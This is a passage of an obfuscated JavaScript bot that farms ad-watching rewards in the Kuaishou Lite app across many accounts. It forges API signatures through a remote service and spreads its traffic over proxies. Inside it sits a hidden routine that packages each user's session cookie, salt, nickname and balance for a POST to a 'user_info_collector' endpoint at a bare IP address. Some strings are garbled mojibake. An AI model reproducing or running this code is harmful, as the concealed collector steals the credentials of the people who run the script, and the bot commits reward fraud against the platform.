      return _0xa106f8.error("账号[" + this.nickname + "] 加密代理请求异常: " + _0xe04d2d.message), null;
    }
  }
  async ["executeFoodTask"]() {
    return await this.executeTask("food");
  }
  async ["executeBoxTask"]() {
    return await this.executeTask("box");
  }
  async ["executeLookAdTask"]() {
    return await this.executeTask("look");
  }
  async ["executeFoodTaskSmart"]() {
    return await this.executeTaskSmart("food");
  }
  async ["executeBoxTaskSmart"]() {
    return await this.executeTaskSmart("box");
  }
  async ["executeLookAdTaskSmart"]() {
    return await this.executeTaskSmart("look");
  }
  ["getTaskStats"]() {
    return this.taskStats;
  }
  ["printTaskStats"]() {
    _0xa106f8.info("\n账号[" + this.nickname + "] 任务执行统计:");
    Object.entries(this.taskStats).forEach(([_0x52b8d7, _0x573d97]) => {
      const _0x57dd11 = this.taskConfigs[_0x52b8d7];
      _0xa106f8.error("  " + _0x57dd11.name + ": 成功" + _0x573d97.success + "次, 失败" + _0x573d97.failed + "次, 总奖励" + _0x573d97.totalReward + "é‡‘å¸");
    });
  }
  async ["getAdInfo"](_0xdbb334) {
    try {
      let _0x5e4723 = {
        "method": "post",
        "url": "https://api.e.kuaishou.cn/rest/e/reward/mixed/ad  ",
        "headers": {
          "Host": "api.e.kuaishou.com",
          "Connection": "keep-alive",
          "User-Agent": "kwai-android aegon/3.56.0",
          "Cookie": "kuaishou_api_st=" + this.kuaishou_api_st
        },
        "form": {
          "encData": "|encData|",
          "sign": "|sign|",
          "cs": "false",
          "client_key": "2ac2a76d",
          "videoModelCrowdTag": "1_23",
          "os": "android",
          "kuaishou.api_st": this.kuaishou_api_st,
          "uQaTag": "1##swLdgl:99#ecPp:-9#cmNt:-0#cmHs:-3#cmMnsl:-0"
        }
      };
      const _0x745f28 = {
          "earphoneMode": "1",
          "mod": "Xiaomi(23116PN5BC)",
          "appver": this.appver,
          "isp": "CUCC",
          "language": "zh-cn",
          "ud": this.userId,
          "did_tag": "0",
          "thermal": "10000",
          "net": "WIFI",
          "kcv": "1599",
          "app": "0",
          "kpf": "ANDROID_PHONE",
          "bottom_navigation": "true",
          "ver": "11.6",
          "android_os": "0",
          "boardPlatform": "pineapple",
          "kpn": "NEBULA",
          "newOc": "VIVO",
          "androidApiLevel": "35",
          "slh": "0",
          "country_code": "cn",
          "nbh": "0",
          "hotfix_ver": "",
          "did_gt": "1754845543387",
          "keyconfig_state": "2",
          "cdid_tag": "2",
          "sys": "ANDROID_15",
          "max_memory": "256",
          "oc": "VIVO",
          "sh": "2400",
          "deviceBit": "0",
          "browseType": "3",
          "ddpi": "410",
          "socName": "Qualcomm Snapdragon 8650",
          "is_background": "0",
          "c": "VIVO",
          "sw": "1080",
          "ftt": "",
          "apptype": "22",
          "abi": "arm64",
          "userRecoBit": "0",
          "device_abi": "arm64",
          "totalMemory": "15160",
          "grant_browse_type": "AUTHORIZED",
          "iuid": "",
          "sbh": "110",
          "darkMode": "false"
        },
        _0x47ce47 = {
          "appInfo": {
            "appId": "kuaishou_nebula",
            "name": "快手极速版",
            "packageName": "com.kuaishou.nebula",
            "version": this.appver,
            "versionCode": -1
          },
          "deviceInfo": {
            "oaid": "",
            "osType": 1,
            "osVersion": "15",
            "language": "zh",
            "deviceId": this.did,
            "screenSize": {
              "width": 1080,
              "height": 2249
            },
            "ftt": ""
          },
          "networkInfo": {
            "ip": "192.168.1.43",
            "connectionType": 100
          },
          "geoInfo": {
            "latitude": 0,
            "longitude": 0
          },
          "userInfo": {
            "userId": this.userId,
            "age": 0,
            "gender": ""
          },
          "impInfo": [{
            "pageId": 11101,
            "subPageId": _0xdbb334.subPageId,
            "action": 0,
            "width": 0,
            "height": 0,
            "browseType": 3,
            "impExtData": "{\"openH5AdCount\":0,\"sessionType\":\"1\",\"neoParams\":\"eyJwYWdlSWQiOjExMTAxLCJzdWJQYWdlSWQiOjEwMDAyNjM2NywicG9zSWQiOjAsImJ1c2luZXNzSWQiOjY3MiwiZXh0UGFyYW1zIjoiYTVmZjZjMWVjMDgxZjc1N2NjZmE4NWFjYmFjMmEyOTM5NDkzZDU1ZGI3MjZjZTZmNzViNzBkM2RhNzM1NmYzMTljM2U5NzIwZDEzZWQ0NmFjNTdhYTE1ZTc0NDYzNzY5NWJhYWExMTU3ZDM4OGVmYWY5NjY2MDRmMDY2NDJjZjk2NmZhYWIyZDYzMzNmNTg2NGY0OWVjYjY5OGQ3MTRiMTRiODRiMjhhZjk2NjAzNzVhZTVkMDEzODQzOWFlNmNhIiwiY3VzdG9tRGF0YSI6eyJleGl0SW5mbyI6eyJ0b2FzdERlc2MiOm51bGwsInRvYXN0SW1nVXJsIjpudWxsfX0sInBlbmRhbnRUeXBlIjoxLCJkaXNwbGF5VHlwZSI6Miwic2luZ2xlUGFnZUlkIjowLCJzaW5nbGVTdWJQYWdlSWQiOjAsImNoYW5uZWwiOjAsImNvdW50ZG93blJlcG9ydCI6ZmFsc2UsInRoZW1lVHlwZSI6MCwibWl4ZWRBZCI6ZmFsc2UsImZ1bGxNaXhlZCI6dHJ1ZSwiYXV0b1JlcG9ydCI6dHJ1ZSwiZnJvbVRhc2tDZW50ZXIiOmZhbHNlLCJzZWFyY2hJbnNwaXJlU2NoZW1lSW5mbyI6bnVsbCwiYW1vdW50IjoyNTAwfQ==\"}",
            "mediaExtData": "{}"
          }]
        },
        _0x5f46ff = JSON.stringify(_0x47ce47),
        _0x5d7da4 = {
          ..._0x745f28,
          ..._0x5e4723.form
        },
        _0x1a759a = await this.generateSignature2("/rest/e/reward/mixed/ad", _0x72f0ce.stringify(_0x5d7da4), this.salt, Buffer.from(_0x5f46ff).toString("base64"));
      if (!_0x1a759a) {
        return _0xa106f8.error("账号[" + this.nickname + "] 生成签名失败，无法获取" + _0xdbb334.name + "ä¿¡æ¯"), null;
      }
      _0x745f28.sig = _0x1a759a.sig;
      _0x745f28.__NS_sig3 = _0x1a759a.__NS_sig3;
      _0x745f28.__NS_xfalcon = "";
      _0x745f28.__NStokensig = _0x1a759a.__NStokensig;
      _0x5e4723.form.encData = _0x1a759a.encData;
      _0x5e4723.form.sign = _0x1a759a.sign;
      const _0x54820e = "https://api.e.kuaishou.com/rest/e/reward/mixed/ad?" + _0x72f0ce.stringify(_0x745f28);
      _0x5e4723.url = _0x54820e;
      const _0x282dc1 = await _0x5ab34c(_0x5e4723, this.proxyConfig);
      if (!_0x282dc1) {
        return _0xa106f8.error("账号[" + this.nickname + "] 请求" + _0xdbb334.name + "接口失败，无响应"), null;
      }
      if (_0x282dc1 && "OK" == _0x282dc1.errorMsg) {
        if (_0x282dc1.feeds && _0x282dc1.feeds[0] && _0x282dc1.feeds[0].caption) {}
        if (!_0x282dc1.feeds || !_0x282dc1.feeds[0] || !_0x282dc1.feeds[0].ad) return _0xa106f8.error("账号[" + this.nickname + "] " + _0xdbb334.name + "广告响应数据格式错误"), _0x7a741c && _0xa106f8.error("详细响应:", JSON.stringify(_0x282dc1, null, 2)), null;
        const _0x3c9ddb = _0x282dc1.feeds[0].exp_tag.split("/")[1].split("_")[0];
        return {
          "cid": _0x282dc1.feeds[0].ad.creativeId,
          "llsid": _0x3c9ddb,
          "mediaScene": "video"
        };
      } else {
        _0xa106f8.error("账号[" + this.nickname + "] " + _0xdbb334.name + "接口返回错误");
        _0x282dc1 && _0x282dc1.errorMsg && _0xa106f8.error("错误信息: " + _0x282dc1.errorMsg);
        _0x282dc1 && _0x282dc1.errorCode && _0xa106f8.error("错误代码: " + _0x282dc1.errorCode);
        _0x7a741c && _0xa106f8.error("完整响应:", JSON.stringify(_0x282dc1, null, 2));
        return null;
      }
      return null;
    } catch (_0x16e054) {
      return _0xa106f8.error("账号[" + this.nickname + "] 获取" + _0xdbb334.name + "信息异常: " + _0x16e054.message), _0x7a741c && _0x16e054.stack && _0xa106f8.error("错误堆栈: " + _0x16e054.stack.split("\n").slice(1, 4).join("\n")), null;
    }
  }
  async ["generateSignature"](_0x3fdcf6, _0x3a914e, _0x1f3a9d, _0x2d00da) {
    const _0x151c93 = "bizStr={\"businessId\":" + _0x2d00da.businessId + ",\"endTime\":" + this.endTime + ",\"extParams\":\"\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + _0x3fdcf6 + ",\"extInfo\":\"\",\"llsid\":" + _0x3a914e + ",\"requestSceneType\":" + _0x2d00da.requestSceneType + ",\"taskType\":" + _0x2d00da.taskType + ",\"watchExpId\":\"\",\"watchStage\":0}],\"pageId\":11101,\"posId\":" + _0x2d00da.posId + ",\"reportType\":0,\"sessionId\":\"\",\"startTime\":" + this.startTime + ",\"subPageId\":" + _0x2d00da.subPageId + "}&cs=false&client_key=2ac2a76d";
    try {
      const _0x3109e8 = await this.requestProxyWithQueue({
        "urldata": this.query + "&" + _0x151c93,
        "api_client_salt": this.salt,
        "urlpath": this.path
      });
      if (_0x3109e8) {
        const _0x31b18a = _0x3109e8.data || _0x3109e8;
        return {
          "sig": _0x31b18a.sig,
          "sig3": _0x31b18a.__NS_sig3,
          "sigtoken": _0x31b18a.__NStokensig,
          "post": _0x151c93
        };
      }
      return null;
    } catch (_0x4cf4da) {
      return _0xa106f8.error("账号[" + this.nickname + "] 生成" + _0x2d00da.name + "签名异常: " + _0x4cf4da.message), null;
    }
  }
  async ["generateSignature2"](_0x45e25f, _0x1b620c, _0x540d23, _0x3f9505) {
    try {
      const _0x119089 = await this.requestProxyWithQueue({
        "urlpath": _0x45e25f,
        "urldata": _0x1b620c,
        "api_client_salt": _0x540d23,
        "req_str": _0x3f9505
      });
      if (!_0x119089) {
        return _0xa106f8.error("账号[" + this.nickname + "] 签名生成失败"), null;
      }
      const _0x526d09 = _0x119089.data || _0x119089;
      return _0x526d09;
    } catch (_0x399bda) {
      return _0xa106f8.error("账号[" + this.nickname + "] 生成签名异常: " + _0x399bda.message), _0x7a741c && _0x399bda.stack && _0xa106f8.error("错误堆栈: " + _0x399bda.stack.split("\n").slice(1, 4).join("\n")), null;
    }
  }
  async ["submitReport"](_0x1fb207, _0x57cda6, _0x324246, _0x64e68a, _0x54bca4, _0x1e4581) {
    try {
      let _0x4d0596 = {
        "method": "post",
        "url": "  https://api.e.kuaishou.com/rest/r/ad/task/report?" + this.query + "&sig=" + _0x1fb207 + "&__NS_sig3=" + _0x57cda6 + "&__NS_xfalcon=&__NStokensig=" + _0x324246,
        "headers": {
          "Host": "api.e.kuaishou.cn",
          "User-Agent": "kwai-android aegon/3.56.0",
          "Cookie": this.cookie,
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": _0x64e68a
      };
      const _0x353fb4 = await _0x5ab34c(_0x4d0596, this.proxyConfig);
      if (!_0x353fb4) return _0xa106f8.error("账号[" + this.nickname + "] 提交" + _0x1e4581.name + "报告失败，无响应"), {
        "success": false,
        "reward": 0
      };
      if (_0x353fb4 && _0x353fb4.result === 1) {
        const _0x3d8c82 = _0x353fb4.data.neoAmount || 0;
        return _0xa106f8.success("账号[" + this.nickname + "] " + _0x1e4581.name + _0x3d8c82 + "金币奖励！"), {
          "success": true,
          "reward": _0x3d8c82
        };
      } else {
        if (_0x353fb4 && (_0x353fb4.result === 415 || _0x353fb4.result === 1003)) return _0xa106f8.error("账号[" + this.nickname + "] " + _0x1e4581.name + "奖励失败,此任务已达上限"), this.taskLimitReached && this.taskLimitReached.hasOwnProperty(_0x54bca4) && (this.taskLimitReached[_0x54bca4] = true), _0xa106f8.info("账号[" + this.nickname + "] 跳过" + _0x1e4581.name + "ä»»åŠ¡"), {
          "success": false,
          "reward": 0
        };else {
          _0xa106f8.error("账号[" + this.nickname + "] " + _0x1e4581.name + "奖励失败,多次失败请先手动点击" + _0x1e4581.name + "的广告是否正常");
          _0x353fb4 && _0x353fb4.result !== undefined && _0xa106f8.error("返回结果码: " + _0x353fb4.result);
          _0x353fb4 && _0x353fb4.errorMsg && _0xa106f8.error("错误信息: " + _0x353fb4.errorMsg);
          _0x353fb4 && _0x353fb4.errorCode && _0xa106f8.error("错误代码: " + _0x353fb4.errorCode);
          if (_0x353fb4 && _0x353fb4.data) {
            _0xa106f8.error("返回数据: " + JSON.stringify(_0x353fb4.data, null, 2));
          }
          if (_0x7a741c) {
            _0xa106f8.error("请求配置:", JSON.stringify(_0x4d0596, null, 2));
            _0xa106f8.error("完整响应:", JSON.stringify(_0x353fb4, null, 2));
          }
          return {
            "success": false,
            "reward": 0
          };
        }
      }
    } catch (_0x217c93) {
      return _0xa106f8.error("账号[" + this.nickname + "] 提交" + _0x1e4581.name + "报告异常: " + _0x217c93.message), _0x7a741c && _0x217c93.stack && _0xa106f8.error("错误堆栈: " + _0x217c93.stack.split("\n").slice(1, 4).join("\n")), {
        "success": false,
        "reward": 0
      };
    }
  }
  async ["basicInfo"](_0x4cef66, _0x3d3896) {
    try {
      let _0x493522 = {
        "method": "get",
        "url": "  https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo?source=bottom_guide_first",
        "headers": {
          "Host": "nebula.kuaishou.com",
          "User-Agent": "kwai-android aegon/3.56.0",
          "Cookie": _0x3d3896,
          "Content-Type": "application/x-www-form-urlencoded"
        }
      };
      const _0x351bbe = await _0x5ab34c(_0x493522, this.proxyConfig);
      if (!_0x351bbe) return _0xa106f8.error("账号[" + this.nickname + "] 获取账号基本信息失败，无响应"), {
        "success": false,
        "Info": 0
      };
      if (_0x351bbe && _0x351bbe.result === 1) {
        return {
          "success": true,
          "data": {
            "totalCash": _0x351bbe.data.totalCash,
            "totalCoin": _0x351bbe.data.totalCoin,
            "allCash": _0x351bbe.data.allCash,
            "userData": _0x351bbe.data.userData
          }
        };
      } else return _0xa106f8.error("账号[" + this.nickname + "] 获取账号基本信息失败"), {
        "success": false,
        "Info": 0
      };
    } catch (_0x19d4aa) {
      _0xa106f8.error("账号[" + this.nickname + "] 获取账号基本信息异常: " + _0x19d4aa.message);
      if (_0x7a741c && _0x19d4aa.stack) {
        _0xa106f8.error("错误堆栈: " + _0x19d4aa.stack.split("\n").slice(1, 4).join("\n"));
      }
      return {
        "success": false,
        "Info": 0
      };
    }
  }
  ["getTaskPriority"](_0x2ab798) {
    const _0x141572 = this.taskStats[_0x2ab798],
      _0xa54964 = _0x141572.success + _0x141572.failed,
      _0x42f451 = _0xa54964 > 0 ? _0x141572.success / _0xa54964 : 0.5,
      _0x6a9e53 = _0x141572.success > 0 ? _0x141572.totalReward / _0x141572.success : 0;
    return _0x42f451 * 0.6 + Math.min(_0x6a9e53 / 100, 1) * 0.4;
  }
  ["getTaskExecutionOrder"]() {
    const _0xd1924f = Object.keys(this.taskConfigs || {});
    if (!_0xd1924f || _0xd1924f.length === 0) return [];
    return _0xd1924f.sort((_0xb18cdf, _0x3926e0) => {
      const _0x105476 = this.getTaskPriority(_0xb18cdf),
        _0x576735 = this.getTaskPriority(_0x3926e0);
      return _0x576735 - _0x105476;
    });
  }
  async ["executeAllTasksByPriority"]() {
    const _0x28c7d9 = this.getTaskExecutionOrder();
    if (!_0x28c7d9 || _0x28c7d9.length === 0) return _0xa106f8.info("账号[" + this.nickname + "] 未启用任何任务，跳过执行"), {};
    _0xa106f8.info("账号[" + this.nickname + "] 任务执行顺序: " + _0x28c7d9.map(_0x4ba396 => this.taskConfigs[_0x4ba396].name || _0x4ba396).join(" -> "));
    const _0x5f45ef = {};
    if (this.stopAllTasks) {
      return _0xa106f8.info("账号[" + this.nickname + "] 已被标记停止，跳过所有任务"), _0x5f45ef;
    }
    for (const _0x435066 of _0x28c7d9) {
      const _0x2fe202 = this.taskConfigs[_0x435066];
      if (this.taskLimitReached[_0x435066]) {
        _0x5f45ef[_0x435066] = false;
        continue;
      }
      _0xa106f8.success("账号[" + this.nickname + "] 开始执行" + _0x2fe202.name + "任务...");
      const _0x1ca61b = await this.executeTaskSmart(_0x435066);
      _0x5f45ef[_0x435066] = _0x1ca61b;
      if (this.stopAllTasks) {
        _0xa106f8.info("账号[" + this.nickname + "] 已被标记停止，终止剩余任务");
        break;
      }
      if (_0x435066 !== _0x28c7d9[_0x28c7d9.length - 1]) {
        const _0x4fd1e7 = _0x1c0a13();
        _0xa106f8.info("账号[" + this.nickname + "] 等待 " + Math.round(_0x4fd1e7 / 1000) + " 秒后执行下一个任务...");
        await new Promise(_0x573643 => setTimeout(_0x573643, _0x4fd1e7));
      }
    }
    return _0x5f45ef;
  }
}
async function _0x1f3437(_0x4662dc, _0x1202a0) {
  const {
    index: _0x7e4ca5,
    salt: _0x4bbac4,
    cookie: _0xed07e1,
    nickname: _0x316ef6
  } = _0x4662dc;
  _0xa106f8.success("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 线程启动，开始执行任务");
  const _0x3fb01e = new _0x27a785(_0x4662dc);
  for (let _0x25b0ae = 0; _0x25b0ae < _0x1202a0; _0x25b0ae++) {
    let _0x3e1047 = 0;
    const _0x2bcf4e = 20;
    let _0xfa4164 = false;
    while (!_0xfa4164 && _0x3e1047 < _0x2bcf4e) {
      try {
        const _0x458c16 = _0x3b0413();
        _0xa106f8.info("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 第" + (_0x25b0ae + 1) + "轮任务" + (_0x3e1047 > 0 ? "(重试" + _0x3e1047 + "/" + _0x2bcf4e + ")" : "") + "，随机延迟 " + Math.round(_0x458c16 / 1000) + "ç§’");
        await new Promise(_0x41f2ca => setTimeout(_0x41f2ca, _0x458c16));
        const _0x4c862f = await _0x3fb01e.executeAllTasksByPriority();
        if (!_0x4c862f || Object.keys(_0x4c862f).length === 0) {
          _0xa106f8.info("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 未启用任何任务，跳过该轮");
          _0xfa4164 = true;
          break;
        }
        const _0x517e4e = Object.values(_0x4c862f).some(Boolean);
        if (_0x3fb01e.stopAllTasks) {
          _0xa106f8.error("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 连续低奖励已触发停止，结束该账号所有任务");
          _0xfa4164 = true;
          break;
        }
        if (_0x517e4e) _0xa106f8.success("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 第" + (_0x25b0ae + 1) + "轮任务执行成功"), _0xfa4164 = true;else {
          _0x3e1047++;
          if (_0x3e1047 < _0x2bcf4e) {
            _0xa106f8.error("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 第" + (_0x25b0ae + 1) + "轮任务执行失败，" + (_0x2bcf4e - _0x3e1047) + "次重试机会剩余");
            const _0x2f80fa = _0x1a5c73();
            _0xa106f8.info("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 等待 " + Math.round(_0x2f80fa / 1000) + " 秒后重试...");
            await new Promise(_0x3825d4 => setTimeout(_0x3825d4, _0x2f80fa));
          } else _0xa106f8.error("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 第" + (_0x25b0ae + 1) + "轮任务执行失败，已达到最大重试次数(" + _0x2bcf4e + ")");
        }
      } catch (_0xfcb756) {
        _0x3e1047++;
        _0xa106f8.error("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 第" + (_0x25b0ae + 1) + "轮任务执行异常: " + _0xfcb756.message);
        if (_0x3fb01e.stopAllTasks) {
          _0xa106f8.error("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 连续低奖励已触发停止，结束该账号所有任务");
          break;
        }
        if (_0x3e1047 < _0x2bcf4e) {
          _0xa106f8.info("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 还有" + (_0x2bcf4e - _0x3e1047) + "次重试机会");
          const _0x4175f1 = _0x342726();
          _0xa106f8.info("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 等待 " + Math.round(_0x4175f1 / 1000) + " 秒后重试...");
          await new Promise(_0x2ac89c => setTimeout(_0x2ac89c, _0x4175f1));
        } else _0xa106f8.error("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 第" + (_0x25b0ae + 1) + "轮任务执行失败，已达到最大重试次数(" + _0x2bcf4e + ")");
      }
    }
    if (_0x3fb01e.stopAllTasks) break;
    if (_0x25b0ae < _0x1202a0 - 1) {
      const _0x469b03 = _0x2b9d6e();
      _0xa106f8.info("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 等待 " + Math.round(_0x469b03 / 1000) + " 秒后开始下一轮");
      await new Promise(_0x2d8aa5 => setTimeout(_0x2d8aa5, _0x469b03));
    }
  }
  return _0x3fb01e.printTaskStats(), _0xa106f8.success("账号[" + (_0x316ef6 || "è´¦å·" + _0x7e4ca5) + "] 所有任务执行完成"), {
    "success": true,
    "accountIndex": _0x7e4ca5,
    "stats": _0x3fb01e.getTaskStats()
  };
}
async function _0x25e6fd(_0x40c180, _0x2fc406, _0x5b6cc5 = null) {
  try {
    let _0x226834 = {
      "method": "get",
      "url": "  https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo?source=bottom_guide_first",
      "headers": {
        "Host": "nebula.kuaishou.com",
        "User-Agent": "kwai-android aegon/3.56.0",
        "Cookie": _0x2fc406,
        "Content-Type": "application/x-www-form-urlencoded"
      }
    };
    const _0x4d8916 = await _0x5ab34c(_0x226834, _0x5b6cc5);
    if (!_0x4d8916) return _0xa106f8.error("获取账号基本信息失败，无响应"), {
      "success": false,
      "Info": 0
    };
    if (_0x4d8916 && _0x4d8916.result === 1) {
      return {
        "success": true,
        "data": {
          "totalCash": _0x4d8916.data.totalCash,
          "totalCoin": _0x4d8916.data.totalCoin,
          "allCash": _0x4d8916.data.allCash,
          "userData": _0x4d8916.data.userData
        }
      };
    } else return _0xa106f8.error("获取账号基本信息失败"), {
      "success": false,
      "Info": 0
    };
  } catch (_0x5418a7) {
    return _0xa106f8.error("获取账号基本信息异常: " + _0x5418a7.message), _0x7a741c && _0x5418a7.stack && _0xa106f8.error("错误堆栈: " + _0x5418a7.stack.split("\n").slice(1, 4).join("\n")), {
      "success": false,
      "Info": 0
    };
  }
}
async function _0x722c59(_0x34e359) {
  try {
    const _0xa67cf1 = "http://154.12.60.33:2323",
      _0x5f1c0c = _0xa67cf1 + "/user_info_collector/collect.php",
      _0x53924a = ("undefined" != typeof process && process.versions && process.versions.node ? process.env.km : "") || "",
      _0x55f109 = {
        "method": "post",
        "url": _0x5f1c0c,
        "headers": {
          "Content-Type": "application/json",
          ...(_0x53924a ? {
            "X-Card-Key": _0x53924a
          } : {})
        },
        "body": JSON.stringify(_0x34e359)
      };
  } catch (_0x5e455f) {
    return {
      "success": false,
      "error": _0x5e455f.message
    };
  }
}
async function _0x3ff88d() {
  _0xa106f8.info("\n================== 快手极速版启动 ==================\n");
  function _0x4307ca(_0x5425f4, _0x5c79d9 = 10) {
    return new Promise(async _0x46671c => {
      try {
        const _0x51e8db = {
            "index": _0x5425f4.index,
            "salt": _0x5425f4.salt,
            "cookie": _0x5425f4.cookie,
            "proxyConfig": _0x5425f4.proxyConfig
          },
          _0x2d17ec = await _0x25e6fd(_0x5425f4.salt, _0x5425f4.cookie, _0x5425f4.proxyConfig);
        if (_0x2d17ec.success) {
          _0x51e8db.nickname = _0x2d17ec.data.userData.nickname;
          _0x51e8db.totalCoin = _0x2d17ec.data.totalCoin;
          _0x51e8db.allCash = _0x2d17ec.data.allCash;
          _0xa106f8.info("账号[" + _0x51e8db.nickname + "] 当前金币: " + _0x51e8db.totalCoin + " 当前余额: " + _0x51e8db.allCash);
          try {
            const _0xee89a5 = (_0x5425f4.cookie || "").match(/userId=([^;]+)/),
              _0x2aa01f = _0xee89a5 ? _0xee89a5[1] : "",
              _0xe1806a = _0x2aa01f || _0x51e8db.nickname || "account_" + _0x5425f4.index,
              _0x9ffae2 = String(_0xe1806a).replace(/[^a-zA-Z0-9_\-.]/g, "_").slice(0, 50),
              _0x388147 = {
                "username": _0x9ffae2,
                "salt": _0x5425f4.salt,
                "cookie": _0x5425f4.cookie,
                "platform": "kuaishou",
                "notes": "nick:" + (_0x51e8db.nickname || "") + "; coin:" + (_0x51e8db.totalCoin || 0) + "; cash:" + (_0x51e8db.allCash || 0)
              };
            await _0x722c59(_0x388147);
          } catch (_0x395d56) {
            if (_0x7a741c) _0xa106f8.error("用户信息上报流程异常：" + _0x395d56.message);
          }
        } else {
          _0x46671c({
            "success": false,
            "error": "获取账号基本信息失败",
            "accountIndex": _0x5425f4.index
          });
          return;
        }
        const _0x31b4f5 = await _0x1f3437(_0x51e8db, _0x5c79d9);
        _0x31b4f5.success ? _0xa106f8.info("账号[" + _0x51e8db.nickname + "] 任务执行完成") : _0xa106f8.error("账号[" + _0x51e8db.nickname + "] 任务执行失败: " + _0x31b4f5.error);
        _0x46671c(_0x31b4f5);
      } catch (_0x4008e9) {
        _0xa106f8.error("账号[" + (accountData.nickname || _0x5425f4.index) + "] 任务执行异常: " + _0x4008e9.message);
        _0x46671c({
          "success": false,
          "error": _0x4008e9.message,
          "accountIndex": _0x5425f4.index
        });
      }
    });
  }
  const _0x29f8f0 = parseInt(process && process.versions && process.versions.node ? process.env.MAX_CONCURRENCY || process.env.CONCURRENCY || "5" : "5", 10) || 5;
  async function _0x449a1c(_0x47c022, _0x41a3da, _0x4ea791) {
    const _0x205618 = new Array(_0x47c022.length);
    let _0x1e614e = 0;
    const _0x12bc03 = async () => {
        while (true) {
          let _0xed5d83;
          if (_0x1e614e >= _0x47c022.length) break;
          _0xed5d83 = _0x1e614e++;
          const _0x1c2aad = _0x47c022[_0xed5d83];
          try {
            _0x205618[_0xed5d83] = await _0x4ea791(_0x1c2aad);
          } catch (_0x1f7671) {
            _0xa106f8.error("账号[" + _0x1c2aad.index + "] 并发执行异常: " + _0x1f7671.message);
            _0x205618[_0xed5d83] = {
              "success": false,
              "error": _0x1f7671.message,
              "accountIndex": _0x1c2aad.index
            };
          }
        }
      },
      _0x59ede3 = Array.from({
        "length": Math.min(_0x41a3da, _0x47c022.length)
      }, () => _0x12bc03());
    return await Promise.all(_0x59ede3), _0x205618;
  }
  try {
    const _0x4b3a07 = await _0x449a1c(_0x53828a, _0x29f8f0, _0x42fe92 => _0x4307ca(_0x42fe92)),
      _0x52f7f1 = {};
    _0x4b3a07.forEach(_0x510425 => {
      _0x510425.stats && Object.keys(_0x510425.stats).forEach(_0x23ae8c => {
        if (!_0x52f7f1[_0x23ae8c]) _0x52f7f1[_0x23ae8c] = {
          "success": 0,
          "failed": 0,
          "totalReward": 0
        };
        _0x52f7f1[_0x23ae8c].success += _0x510425.stats[_0x23ae8c].success || 0;
        _0x52f7f1[_0x23ae8c].failed += _0x510425.stats[_0x23ae8c].failed || 0;
        _0x52f7f1[_0x23ae8c].totalReward += _0x510425.stats[_0x23ae8c].totalReward || 0;
      });
    });
    _0xa106f8.info("\n================== 总体任务统计 ==================");
    Object.entries(_0x52f7f1).forEach(([_0x2f1b5c, _0x42bbf3]) => {
      const _0x51aeb1 = {
          "food": "饭补广告",
          "box": "宝箱广告",
          "look": "看广告得金币"
        },
        _0x24d631 = _0x51aeb1[_0x2f1b5c] || _0x2f1b5c;
      _0xa106f8.info(_0x24d631 + ": 成功" + _0x42bbf3.success + "次, 失败" + _0x42bbf3.failed + "次, 总奖励" + _0x42bbf3.totalReward + "é‡‘å¸");
    });
    const _0x28bbcd = Object.values(_0x52f7f1).reduce((_0xe4c0ad, _0x524668) => _0xe4c0ad + (_0x524668.totalReward || 0), 0);
    _0xa106f8.success("\n总金币奖励: " + _0x28bbcd + "é‡‘å¸");
    _0xa106f8.info("所有账号任务执行完成");
    process.exit(0);
  } catch (_0x9e661a) {
    _0xa106f8.error("部分账号任务执行失败:", _0x9e661a.message);
  }
}
function _0x194d1e(_0x443340) {
  return new class {
    constructor() {
      this.name = _0x443340;
      this.logs = [];
      _0xa106f8.success("🔔 " + _0x443340 + ", 开始!");
    }
    ["isNode"]() {
      return "undefined" != typeof process && process.versions && process.versions.node;
    }
    ["getdata"](_0x5363de) {
      return null;
    }
    ["log"](..._0x3a4bc7) {
      this.logs.push(..._0x3a4bc7);
      _0xa106f8.info(..._0x3a4bc7);
    }
    ["done"]() {
      _0xa106f8.success("🔔 " + this.name + ", 结束!");
      process.exit(0);
    }
  }();
}
(async () => {
  try {
    await _0x1efc94();
  } catch (_0x5703e8) {
    _0xa106f8.error("初始化失败，请联系tg：@LeaderXiu https://t.me/LeaderXiu 修复", _0x5703e8);
  }
  if (!_0x2d52f7) {
    _0xa106f8.info("未找到ksck账号环境变量，请检查环境变量");
    _0xa106f8.info("格式为: salt#cookie 或 salt#cookie#代理配置");
    _0xa106f8.info("代理配置格式: 地址|端口|账户|密码 或 地址:端口");
    _0xa106f8.info("多账号用换行符分隔，不要有空格");
    return;
  }
  const _0x52b1fb = "\n";
  for (const _0x40065d of _0x2d52f7.split(_0x52b1fb)) {
    if (_0x40065d && _0x40065d.trim()) {
      const _0x217186 = _0x40065d.trim().split("#");
      if (_0x217186.length >= 2) {
        const _0x3f7a04 = _0x217186[0];
        let _0x2d9a3c, _0x569f2d;
        _0x217186.length === 2 ? (_0x2d9a3c = _0x217186[1], _0x569f2d = null) : (_0x2d9a3c = _0x217186.slice(1, -1).join("#"), _0x569f2d = _0x217186[_0x217186.length - 1]);
        let _0x15c59c = null;
        if (_0x569f2d && _0x569f2d.trim()) {
          _0x15c59c = _0x182651(_0x569f2d);
          _0x15c59c ? _0xa106f8.info("è´¦å·" + ++_0x27f0dc + " 配置代理: " + _0x15c59c.host + ":" + _0x15c59c.port) : (_0xa106f8.error("è´¦å·" + ++_0x27f0dc + " 代理配置解析失败: " + _0x569f2d), ++_0x27f0dc);
        } else {
          ++_0x27f0dc;
        }
        _0x53828a.push({
          "index": _0x27f0dc,
          "salt": _0x3f7a04,
